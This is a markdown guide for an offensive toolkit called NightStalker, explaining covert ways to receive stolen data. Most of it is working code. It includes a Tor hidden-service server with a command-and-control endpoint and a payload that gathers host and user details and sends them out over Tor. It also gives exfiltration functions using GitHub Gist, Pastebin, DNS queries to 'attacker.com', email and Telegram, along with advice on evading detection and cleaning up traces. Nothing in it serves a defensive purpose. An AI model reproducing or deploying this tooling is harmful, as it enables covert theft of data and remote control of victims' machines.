# NightStalker Covert Server Guide

## Overview
You don't need a traditional home server! There are multiple covert ways to receive exfiltrated data, from Tor hidden services to legitimate cloud services.

## Option 1: Tor Hidden Service (Most Covert)

### Setup Tor Hidden Service

#### Step 1: Install Tor
```bash
# Windows (using Chocolatey)
choco install tor

# Linux
sudo apt-get install tor

# macOS
brew install tor
```

#### Step 2: Configure Tor Hidden Service
Create `torrc` configuration file:

```bash
# Create tor configuration
mkdir -p ~/tor-hidden-service
cd ~/tor-hidden-service

# Create torrc file
cat > torrc << 'EOF'
HiddenServiceDir /path/to/your/hidden/service/directory
HiddenServicePort 80 127.0.0.1:8080
HiddenServicePort 443 127.0.0.1:8443

# Optional: Add more ports for different services
HiddenServicePort 8080 127.0.0.1:8080

# Security settings
HiddenServiceMaxStreams 0
HiddenServiceMaxStreamsCloseCircuit 0
EOF
```

#### Step 3: Create Python Server
```python
#!/usr/bin/env python3
"""
Covert Tor Hidden Service Server
Receives exfiltrated data via Tor network
"""

import socket
import threading
import json
import base64
import time
import logging
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import ssl

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('covert_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class CovertRequestHandler(BaseHTTPRequestHandler):
    """Handle incoming exfiltration requests"""
    
    def log_message(self, format, *args):
        """Override to use our logger"""
        logger.info(f"{self.client_address[0]} - {format % args}")
    
    def do_POST(self):
        """Handle POST requests (exfiltrated data)"""
        try:
            # Get content length
            content_length = int(self.headers.get('Content-Length', 0))
            
            # Read data
            data = self.rfile.read(content_length)
            
            # Parse request
            parsed_url = urlparse(self.path)
            query_params = parse_qs(parsed_url.query)
            
            # Extract metadata
            source = query_params.get('source', ['unknown'])[0]
            timestamp = query_params.get('timestamp', [str(time.time())])[0]
            
            # Decode data if needed
            try:
                decoded_data = json.loads(data.decode('utf-8'))
                data_type = 'json'
            except:
                try:
                    decoded_data = base64.b64decode(data).decode('utf-8')
                    data_type = 'base64'
                except:
                    decoded_data = data.decode('utf-8', errors='ignore')
                    data_type = 'raw'
            
            # Save data
            self.save_exfiltrated_data(decoded_data, source, timestamp, data_type)
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
            
            logger.info(f"Received data from {source}: {len(data)} bytes")
            
        except Exception as e:
            logger.error(f"Error processing request: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        """Handle GET requests (health checks, commands)"""
        try:
            parsed_url = urlparse(self.path)
            path = parsed_url.path
            
            if path == '/health':
                # Health check endpoint
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
                
            elif path == '/command':
                # Command and control endpoint
                query_params = parse_qs(parsed_url.query)
                agent_id = query_params.get('agent', ['unknown'])[0]
                
                # Return commands for the agent
                commands = self.get_commands_for_agent(agent_id)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(commands).encode())
                
            else:
                # Default response
                self.send_response(404)
                self.end_headers()
                
        except Exception as e:
            logger.error(f"Error in GET request: {e}")
            self.send_response(500)
            self.end_headers()
    
    def save_exfiltrated_data(self, data, source, timestamp, data_type):
        """Save exfiltrated data to file"""
        try:
            # Create data directory
            import os
            os.makedirs('exfiltrated_data', exist_ok=True)
            
            # Create filename
            filename = f"exfiltrated_data/{source}_{timestamp}.{data_type}"
            
            # Save data
            if isinstance(data, dict):
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
            else:
                with open(filename, 'w') as f:
                    f.write(str(data))
            
            logger.info(f"Saved data to {filename}")
            
        except Exception as e:
            logger.error(f"Error saving data: {e}")
    
    def get_commands_for_agent(self, agent_id):
        """Get commands for a specific agent"""
        # This is where you'd implement command and control
        commands = {
            'agent_id': agent_id,
            'commands': [
                {
                    'id': 'cmd_001',
                    'type': 'recon',
                    'payload': 'gather_system_info'
                },
                {
                    'id': 'cmd_002', 
                    'type': 'exfil',
                    'payload': 'exfiltrate_data'
                }
            ]
        }
        return commands

def start_tor_server(port=8080, use_ssl=False):
    """Start the covert server"""
    try:
        # Create server
        server = HTTPServer(('127.0.0.1', port), CovertRequestHandler)
        
        if use_ssl:
            # SSL configuration (optional)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain('server.crt', 'server.key')
            server.socket = context.wrap_socket(server.socket, server_side=True)
        
        logger.info(f"Starting covert server on port {port}")
        logger.info("Server will be accessible via Tor hidden service")
        
        # Start server in thread
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        return server
        
    except Exception as e:
        logger.error(f"Failed to start server: {e}")
        return None

def get_onion_address():
    """Get the .onion address for this hidden service"""
    try:
        # Read the hostname file created by Tor
        with open('/path/to/your/hidden/service/directory/hostname', 'r') as f:
            onion_address = f.read().strip()
        return onion_address
    except Exception as e:
        logger.error(f"Could not read onion address: {e}")
        return None

if __name__ == "__main__":
    # Start the server
    server = start_tor_server(port=8080)
    
    if server:
        print("🌙 Covert Tor Server Started")
        print("=" * 40)
        
        # Get onion address
        onion_address = get_onion_address()
        if onion_address:
            print(f"🔗 Tor Hidden Service: {onion_address}")
            print(f"📡 Endpoint: http://{onion_address}/")
            print(f"🔒 Secure endpoint: https://{onion_address}/")
        
        print("\n📋 Available endpoints:")
        print("  POST / - Receive exfiltrated data")
        print("  GET  /health - Health check")
        print("  GET  /command?agent=<id> - Command and control")
        
        print("\n⏳ Server running... Press Ctrl+C to stop")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n🛑 Shutting down server...")
            server.shutdown()
```

#### Step 4: Update NightStalker Payload
```python
# Update your exfiltration payload to use Tor
exfil_code = '''
import os, json, socket, platform
import urllib.request
import socks
import socket

def setup_tor_proxy():
    """Setup Tor SOCKS proxy"""
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

def exfil_via_tor():
    # Setup Tor proxy
    setup_tor_proxy()
    
    # Gather data
    data = {
        'hostname': socket.gethostname(),
        'user': os.getenv('USERNAME'),
        'platform': platform.platform(),
        'timestamp': time.time()
    }
    
    # Your .onion address
    onion_address = "your-onion-address.onion"
    
    try:
        req = urllib.request.Request(
            f'http://{onion_address}/',
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req)
        print("Data exfiltrated via Tor successfully")
    except Exception as e:
        print(f"Tor exfiltration failed: {e}")

exfil_via_tor()
'''
```

## Option 2: Legitimate Cloud Services (Stealth)

### GitHub Gist Method
```python
# Use GitHub Gist as a covert data store
import requests
import json
import base64

def exfil_to_github_gist(data, gist_id, token):
    """Exfiltrate data to GitHub Gist"""
    
    # Encode data
    encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
    
    # Update gist
    headers = {
        'Authorization': f'token {token}',
        'Content-Type': 'application/json'
    }
    
    payload = {
        'files': {
            'data.txt': {
                'content': encoded_data
            }
        }
    }
    
    response = requests.patch(
        f'https://api.github.com/gists/{gist_id}',
        headers=headers,
        json=payload
    )
    
    return response.status_code == 200
```

### Pastebin Method
```python
# Use Pastebin as a covert data store
import requests

def exfil_to_pastebin(data, api_key):
    """Exfiltrate data to Pastebin"""
    
    payload = {
        'api_dev_key': api_key,
        'api_option': 'paste',
        'api_paste_code': json.dumps(data),
        'api_paste_name': 'system_info',
        'api_paste_format': 'json',
        'api_paste_private': '1'  # Unlisted
    }
    
    response = requests.post('https://pastebin.com/api/api_post.php', data=payload)
    
    if response.status_code == 200:
        paste_url = response.text
        return paste_url
    return None
```

## Option 3: DNS Exfiltration (No Server Needed)

```python
# Use DNS queries to exfiltrate data without a server
import socket
import base64

def dns_exfil(data, domain="attacker.com"):
    """Exfiltrate data via DNS queries"""
    
    # Encode data
    encoded = base64.b64encode(data.encode()).decode()
    
    # Split into chunks
    chunk_size = 50  # DNS label limit
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        # Create DNS query
        query = f"{chunk}.{domain}"
        
        try:
            # Send DNS query
            socket.gethostbyname(query)
            print(f"DNS chunk {i+1} sent: {chunk}")
        except:
            pass
        
        time.sleep(1)  # Rate limiting
```

## Option 4: Email Exfiltration

```python
# Use email for exfiltration
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def email_exfil(data, smtp_server, username, password, recipient):
    """Exfiltrate data via email"""
    
    msg = MIMEMultipart()
    msg['From'] = username
    msg['To'] = recipient
    msg['Subject'] = 'System Report'
    
    # Encode data in email body
    body = base64.b64encode(json.dumps(data).encode()).decode()
    msg.attach(MIMEText(body, 'plain'))
    
    # Send email
    server = smtplib.SMTP(smtp_server, 587)
    server.starttls()
    server.login(username, password)
    server.send_message(msg)
    server.quit()
```

## Option 5: Telegram Bot (Very Stealth)

```python
# Use Telegram bot for exfiltration
import requests

def telegram_exfil(data, bot_token, chat_id):
    """Exfiltrate data via Telegram bot"""
    
    # Encode data
    encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
    
    # Send message
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': encoded_data
    }
    
    response = requests.post(url, json=payload)
    return response.status_code == 200
```

## Quick Setup: Tor Hidden Service

### 1. Install Tor
```bash
# Windows
choco install tor

# Start Tor service
tor --service install
tor --service start
```

### 2. Create Hidden Service
```bash
# Create directory
mkdir C:\tor-hidden-service

# Create torrc
echo HiddenServiceDir C:\tor-hidden-service > C:\tor\torrc
echo HiddenServicePort 80 127.0.0.1:8080 >> C:\tor\torrc

# Restart Tor
tor --service stop
tor --service start
```

### 3. Get Your .onion Address
```bash
# Check the hostname file
type C:\tor-hidden-service\hostname
```

### 4. Update NightStalker Payload
```python
# Replace the target URL in your payload
onion_address = "your-onion-address.onion"  # From step 3
target_url = f"http://{onion_address}/"
```

## Security Considerations

### Tor Hidden Service Security
- Use strong authentication
- Implement rate limiting
- Monitor for abuse
- Use HTTPS within Tor
- Regular key rotation

### Alternative Security
- Use legitimate services (GitHub, Pastebin)
- Implement data encryption
- Use steganography
- Multiple exfiltration channels
- Clean up traces

## No-Server Options Summary

1. **Tor Hidden Service**: Most covert, requires Tor setup
2. **GitHub Gist**: Looks like normal development activity
3. **Pastebin**: Appears as normal data sharing
4. **DNS Queries**: No server needed, very stealthy
5. **Email**: Traditional but effective
6. **Telegram**: Modern, encrypted, looks normal

The **Tor hidden service** is the most covert option, but **GitHub Gist** or **DNS exfiltration** are easier to set up and still very stealthy! 